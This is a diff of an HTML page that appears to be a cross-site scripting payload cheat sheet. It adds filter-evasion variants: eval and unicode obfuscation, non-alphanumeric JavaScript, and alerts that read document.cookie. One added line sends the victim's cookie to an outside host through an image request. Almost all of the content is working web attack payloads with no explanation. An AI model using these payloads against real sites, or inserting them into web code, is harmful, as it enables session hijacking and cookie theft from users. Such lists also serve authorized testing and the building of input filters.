@@ -13,14 +13,18 @@ svg onload=“alert(1)”<br/>
 /”&gt;&lt;svg onload=alert(1)&gt;<br/>
 \’-alert(1)//<br/>
 ’-alert(1)-‘<br/>
+alert(document.cookie)<br/>
+alert(document['cookie'])<br/>
+with(document)alert(cookie)<br/>
 &lt;/script&gt;&lt;svg onload=alert(1)&gt;<br/>
 &lt;body onLoad="alert('XSS');"<br/>
 &lt;body onunload="javascript:alert('XSS');"&gt;<br/>
 ” onmouseover=alert(1)//<br/>
 &lt;script&gt;alert(1)&lt;/script&gt;<br/>
-<span style="font-size: 10pt"><span style="font-family: sans">&lt;script&gt;alert('CSS Vulnerable')&lt;/script&gt;<br/>
-</span></span><span style="font-size: 10pt"><span style="font-family: sans">&lt;script language="JavaScript"&gt;alert('XSS')&lt;/script&gt;</span></span><br/>
+<span style="font-family: sans"><span style="font-size: 10pt">&lt;script&gt;alert('CSS Vulnerable')&lt;/script&gt;<br/>
+</span></span><span style="font-family: sans"><span style="font-size: 10pt">&lt;script language="JavaScript"&gt;alert('XSS')&lt;/script&gt;</span></span><br/>
 &lt;script src=javascript:alert(1)&gt;<br/>
+&lt;script x&gt;alert(1)&lt;/script&gt;/<br/>
 &lt;iframe src=javascript:alert(1)&gt;<br/>
 &lt;embed src=javascript:alert(1)&gt;<br/>
 &lt;a href=javascript:alert(1)&gt;click<br/>
@@ -49,9 +53,10 @@ svg onload=“alert(1)”<br/>
 &lt;IMG LOWSRC=\"javascript:alert('XSS')\"&gt;<br/>
 &lt;IMG onmouseover="alert('xxs')"&gt;<br/>
 &lt;a onmouseover="alert(2)"&gt;d&lt;/a&gt;<br/>
+&lt;/a onmousemove="alert(1)"&gt;<br/>
 javascript:alert('executing script')<br/>
-&lt;font style='color:expression(alert(document.cookie))'&gt;<span style="font-family: sans"><span style="font-size: 10pt"><br/>
-</span></span><span style="font-family: sans"><span style="font-size: 10pt">&amp;{alert('CSS Vulnerable')};</span></span><br/>
+&lt;font style='color:expression(alert(document.cookie))'&gt;<span style="font-size: 10pt"><span style="font-family: sans"><br/>
+</span></span><span style="font-size: 10pt"><span style="font-family: sans">&amp;{alert('CSS Vulnerable')};</span></span><br/>
 &lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;URL=http://;URL=javascript:alert('XSS');\"&gt;<br/>
 &lt;META HTTP-EQUIV=\"refresh\"CONTENT=\"0;url=javascript:alert('XSS');\"&gt;<br/>
 &lt;img src=1.gif onerror=alert(1)&gt;<br/>
@@ -61,4 +66,21 @@ javascript:alert('executing script')<br/>
 &lt;style&gt;@im\port'\ja\vasc\ript:alert(\"XSS\")';&lt;/style&gt;<br/>
 &lt;scr&lt;script&gt;ipt&gt;alert('XSS');&lt;/scr&lt;/script&gt;ipt&gt;<br/>
 &lt;a&amp;xss=&lt;x:vmlframe src=payload&gt;<br/>
-'&amp;js_xss=";alert(0)//</body></html>
+'&amp;js_xss=";alert(0)//<br/>
+&lt;isindex type=image src=1 onerror=alert(1)&gt;<br/>
+&lt;isindex action=javascript:alert(1) type=image&gt;<br/>
+&lt;img src=x:alert(alt) onerror=eval(src) alt=0&gt;<br/>
+&lt;img src="x:alert" onerror="eval(src%2b'(0)')"&gt;<br/>
+&lt;img src="x:gif" onerror="eval('al'%2b'lert(0)')"&gt;<br/>
+&lt;img src="x:gif" onerror="window['al\u0065rt'](0)"&gt;&lt;/img&gt;<br/>
+&lt;x:script xmlns:x="http://www.w3.org/1999/xhtml"&gt;alert('xss');&lt;/x:script&gt;<br/>
+É=[Å=[],µ=!Å+Å][µ[È=-~-~++Å]+({}+Å) [Ç=!!Å+µ,ª=Ç[Å]+Ç[+!Å],Å]+ª])() [µ[Å]+µ[Å+Å]+Ç[È]+ª](Å)<br/>
+($=[$=[]][(__=!$+$)[_=-~-~-~$]+({}+$)[_/_]+($$=($_=!''+$)[_/_]+$_[+$])])()[__[_/_]+__[_+~$]+$_[_]+$$](_/_)<br/>
+&lt;b/alt="1"onmouseover=InputBox+1 language=vbs&gt;test&lt;/b&gt;<br/>
+&lt;b "&lt;script&gt;alert(1)&lt;/script&gt;"&gt;hola&lt;/b&gt;<br/>
+this[[]+('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+name,new Array)<br/>
+`&amp;PARAM=`%20onmouseover='alert(1)<br/>
+<br/>
+";document.write('&lt;img sr'%2b'c=http://p42.us/x.png?'%2bdocument['cookie']%2b'&gt;');"<br/>
+<br/>
+</body></html>
